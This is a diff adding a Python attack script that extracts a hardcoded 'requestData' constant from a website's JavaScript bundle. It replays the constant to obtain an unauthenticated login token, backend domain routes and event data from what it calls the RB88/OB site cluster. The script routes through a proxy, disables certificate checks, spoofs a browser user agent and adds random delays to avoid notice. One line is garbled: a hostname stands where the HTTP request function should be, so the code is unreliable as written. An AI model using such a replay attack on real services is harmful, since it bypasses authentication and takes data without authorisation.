@@ -1,0 +1,44 @@
+#!/usr/bin/env python3
+# fakerToken 硬编码 requestData 常量重放（RB88/OB 站群通用）
+# 实测靶标: example.com 前端主包 index-10-09-17-42-CL2wXCgB.js
+import re, sys, json, os, random, time, urllib.parse
+import requests, urllib3
+urllib3.disable_warnings()
+
+PROXY = 'http://127.0.0.1:7892'          # 走隧道出口时填；直连设 None
+HOST  = 'example.com'  # fakerToken 服务（取自主包 FAKER_TOKEN_BASE_URL）
+P = {'http': PROXY, 'https': PROXY} if PROXY else None
+UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.30 Safari/537.36'
+
+# 1) 从主包提取常量：正则 requestData:"<base64>"
+def extract_blob(main_js_path):
+    t = open(main_js_path, encoding='utf-8', errors='replace').read()
+    m = re.findall(r'requestData\s*:\s*"([A-Za-z0-9+/=]{40,})"', t)
+    if not m:
+        sys.exit('[!] 未找到 requestData 常量，确认这是 Vite 主包而不是 chunk')
+    return m[0]
+
+def post(path, data, tag):
+    time.sleep(random.uniform(0.6, 1.6))
+    h = {'Host': HOST, 'User-Agent': UA, 'Accept': 'application/json, text/plain, */*',
+         'Origin': 'https://example.com', 'Referer': 'https://example.com/',
+         'Content-Type': 'application/x-www-form-urlencoded'}   # 必须 form，用 JSON 会 50040
+    r = target9.example.com('https://' + HOST + path, headers=h, data=data,
+                      proxies=P, verify=False, timeout=25)
+    print('[%s] HTTP %s' % (tag, r.status_code))
+    try:
+        print(json.dumps(r.json(), ensure_ascii=False, indent=1)[:3000])
+    except Exception:
+        print(r.text[:1500])
+    return r
+
+if __name__ == '__main__':
+    blob = extract_blob(sys.argv[1] if len(sys.argv) > 1 else 'index.js')
+    print('[*] requestData 常量长度 = %d' % len(blob))
+    enc = urllib.parse.quote(blob, safe='')
+    # 2) OB 平台登录 token（未认证签发）
+    post('/ob/v2/getTryToken', 'product=rb&requestData=' + enc, 'getTryToken')
+    # 3) 线路后端域名路由表
+    post('/fbsport/v1/getToken', {'requestData': blob}, 'getToken')
+    # 4) 真实赛事数据
+    post('/common/v1/hotLegues/getHotLegues', 'requestData=' + enc, 'hotLegues')
